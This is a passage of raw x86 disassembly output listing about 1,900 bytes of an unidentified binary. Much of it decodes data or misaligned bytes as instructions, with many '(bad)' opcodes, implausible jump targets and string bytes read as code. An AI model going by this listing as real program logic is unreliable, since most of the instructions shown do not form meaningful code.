  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
